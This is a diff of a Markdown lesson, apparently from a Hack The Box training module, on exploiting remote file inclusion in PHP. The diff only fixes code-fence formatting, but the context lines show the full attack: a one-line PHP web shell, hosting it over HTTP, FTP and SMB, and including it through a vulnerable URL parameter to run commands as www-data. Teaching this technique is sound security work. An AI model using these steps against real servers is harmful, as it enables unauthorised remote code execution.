@@ -34,8 +34,7 @@ Furthermore, as we may note in the above table, some functions do allow includin
 
 In most languages, including remote URLs is considered as a dangerous practice as it may allow for such vulnerabilities. This is why remote URL inclusion is usually disabled by default. For example, any remote URL inclusion in PHP would require the `allow_url_include` setting to be enabled. We can check whether this setting is enabled through LFI, as we did in the previous section:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo 'W1BIUF0KCjs7Ozs7Ozs7O...SNIP...4KO2ZmaS5wcmVsb2FkPQo=' | base64 -d | grep allow_url_include
 
 allow_url_include = On
@@ -57,8 +56,7 @@ We also see that we were able to specify port `80` and get the web application o
 
 The first step in gaining remote code execution is creating a malicious script in the language of the web application, PHP in this case. We can use a custom web shell we download from the internet, use a reverse shell script, or write our own basic web shell as we did in the previous section, which is what we will do in this case:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ echo '<?php system($_GET["cmd"]); ?>' > shell.php
 ```
 
@@ -68,8 +66,7 @@ Now, all we need to do is host this script and include it through the RFI vulner
 
 Now, we can start a server on our machine with a basic python server with the following command, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
 Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
 ```
@@ -82,8 +79,7 @@ http://<SERVER\_IP>:<PORT>/index.php?language=http://<OUR\_IP>:<LISTENING\_PORT>
 
 As we can see, we did get a connection on our python server, and the remote shell was included, and we executed the specified command:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python3 -m http.server <LISTENING_PORT>
 Serving HTTP on 0.0.0.0 port <LISTENING_PORT> (http://0.0.0.0:<LISTENING_PORT>/) ...
 
@@ -96,8 +92,7 @@ SERVER_IP - - [SNIP] "GET /shell.php HTTP/1.0" 200 -
 
 As mentioned earlier, we may also host our script through the FTP protocol. We can start a basic FTP server with Python's `pyftpdlib`, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ sudo python -m pyftpdlib -p 21
 
 [SNIP] >>> starting FTP server on 0.0.0.0:21, pid=23686 <<<
@@ -114,8 +109,7 @@ http://<SERVER\_IP>:<PORT>/index.php?language=ftp://<OUR\_IP>/shell.php&cmd=id
 
 As we can see, this worked very similarly to our http attack, and the command was executed. By default, PHP tries to authenticate as an anonymous user. If the server requires valid authentication, then the credentials can be specified in the URL, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ curl 'http://<SERVER_IP>:<PORT>/index.php?language=ftp://user:pass@<OUR_IP>/shell.php&cmd=id'
 ...SNIP...
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -127,8 +121,7 @@ If the vulnerable web application is hosted on a Windows server (which we can te
 
 We can spin up an SMB server using `Impacket's smbserver.py`, which allows anonymous authentication by default, as follows:
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ impacket-smbserver -smb2support share $(pwd)
 Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
 
